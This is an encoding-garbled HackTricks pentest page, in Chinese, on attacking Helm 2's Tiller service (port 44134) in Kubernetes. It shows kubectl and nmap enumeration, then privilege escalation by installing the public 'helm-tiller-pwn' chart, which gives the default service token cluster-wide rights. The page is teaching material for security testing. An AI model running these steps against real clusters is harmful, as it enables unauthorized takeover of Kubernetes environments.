<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

å…¶ä»–æ”¯æŒHackTricksçš„æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘ä»¬çš„**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>


# åŸºæœ¬ä¿¡æ¯

Helmæ˜¯Kubernetesçš„**åŒ…ç®¡ç†å™¨**ã€‚å®ƒå…è®¸æ‰“åŒ…YAMLæ–‡ä»¶å¹¶åœ¨å…¬å…±å’Œç§æœ‰å­˜å‚¨åº“ä¸­åˆ†å‘å®ƒä»¬ã€‚è¿™äº›åŒ…è¢«ç§°ä¸º**Helm Charts**ã€‚**Tiller**æ˜¯é»˜è®¤åœ¨ç«¯å£44134ä¸Šè¿è¡Œçš„**æœåŠ¡**ã€‚ 

**é»˜è®¤ç«¯å£:** 44134
```
PORT      STATE SERVICE VERSION
44134/tcp open  unknown
```
# æšä¸¾

å¦‚æœä½ å¯ä»¥**æšä¸¾ä¸åŒå‘½åç©ºé—´çš„ pods å’Œ/æˆ– services**ï¼Œè¯·æšä¸¾å®ƒä»¬å¹¶æœç´¢åç§°ä¸­å¸¦æœ‰**"tiller"**çš„å®ä¾‹ï¼š
```bash
kubectl get pods | grep -i "tiller"
kubectl get services | grep -i "tiller"
kubectl get pods -n kube-system | grep -i "tiller"
kubectl get services -n kube-system | grep -i "tiller"
kubectl get pods -n <namespace> | grep -i "tiller"
kubectl get services -n <namespace> | grep -i "tiller"
```
ç¤ºä¾‹ï¼š
```bash
kubectl get pods -n kube-system
NAME                                       READY   STATUS             RESTARTS   AGE
kube-scheduler-controlplane                1/1     Running            0          35m
tiller-deploy-56b574c76d-l265z             1/1     Running            0          35m

kubectl get services -n kube-system
NAME            TYPE        CLUSTER-IP     EXTERNAL-IP   PORT(S)                  AGE
kube-dns        ClusterIP   10.96.0.10     <none>        53/UDP,53/TCP,9153/TCP   35m
tiller-deploy   ClusterIP   10.98.57.159   <none>        44134/TCP                35m
```
ä½ ä¹Ÿå¯ä»¥å°è¯•æŸ¥æ‰¾è¿è¡Œåœ¨ç«¯å£44134ä¸Šçš„è¯¥æœåŠ¡ï¼š
```bash
sudo nmap -sS -p 44134 <IP>
```
ä¸€æ—¦å‘ç°äº†å®ƒï¼Œæ‚¨å¯ä»¥é€šè¿‡ä¸‹è½½å®¢æˆ·ç«¯ Helm åº”ç”¨ç¨‹åºä¸å…¶é€šä¿¡ã€‚æ‚¨å¯ä»¥ä½¿ç”¨è¯¸å¦‚ `homebrew` è¿™æ ·çš„å·¥å…·ï¼Œæˆ–æŸ¥çœ‹[**å®˜æ–¹å‘å¸ƒé¡µé¢**](https://github.com/helm/helm/releases)**ã€‚**æœ‰å…³æ›´å¤šè¯¦ç»†ä¿¡æ¯ï¼Œæˆ–å…¶ä»–é€‰é¡¹ï¼Œè¯·å‚é˜…[å®‰è£…æŒ‡å—](https://v2.helm.sh/docs/using\_helm/#installing-helm)ã€‚

ç„¶åï¼Œæ‚¨å¯ä»¥**æšä¸¾æœåŠ¡**ï¼š
```
helm --host tiller-deploy.kube-system:44134 version
```
## ææƒ

é»˜è®¤æƒ…å†µä¸‹ï¼Œ**Helm2** æ˜¯ä»¥ **é«˜æƒé™** å®‰è£…åœ¨ **å‘½åç©ºé—´ kube-system** ä¸­çš„ï¼Œå› æ­¤å¦‚æœæ‚¨æ‰¾åˆ°è¯¥æœåŠ¡å¹¶å…·æœ‰è®¿é—®æƒé™ï¼Œè¿™å¯èƒ½å…è®¸æ‚¨ **æå‡æƒé™**ã€‚

æ‚¨åªéœ€è¦å®‰è£…ä¸€ä¸ªç±»ä¼¼äºè¿™ä¸ªçš„è½¯ä»¶åŒ…ï¼š[**https://github.com/Ruil1n/helm-tiller-pwn**](https://github.com/Ruil1n/helm-tiller-pwn)ï¼Œè¿™å°†ä½¿ **é»˜è®¤æœåŠ¡ä»¤ç‰Œå¯ä»¥è®¿é—®æ•´ä¸ªé›†ç¾¤ä¸­çš„æ‰€æœ‰å†…å®¹**ã€‚
```
git clone https://github.com/Ruil1n/helm-tiller-pwn
helm --host tiller-deploy.kube-system:44134 install --name pwnchart helm-tiller-pwn
/pwnchart
```
åœ¨[http://rui0.cn/archives/1573](http://rui0.cn/archives/1573)ä¸­ï¼Œä½ å¯ä»¥æ‰¾åˆ°**æ”»å‡»çš„è§£é‡Š**ï¼Œä½†åŸºæœ¬ä¸Šï¼Œå¦‚æœä½ é˜…è¯»_helm-tiller-pwn/pwnchart/templates/_ç›®å½•ä¸‹çš„[**clusterrole.yaml**](https://github.com/Ruil1n/helm-tiller-pwn/blob/main/pwnchart/templates/clusterrole.yaml)å’Œ[**clusterrolebinding.yaml**](https://github.com/Ruil1n/helm-tiller-pwn/blob/main/pwnchart/templates/clusterrolebinding.yaml)æ–‡ä»¶ï¼Œä½ ä¼šçœ‹åˆ°**æ‰€æœ‰æƒé™éƒ½è¢«èµ‹äºˆäº†é»˜è®¤ä»¤ç‰Œ**ã€‚
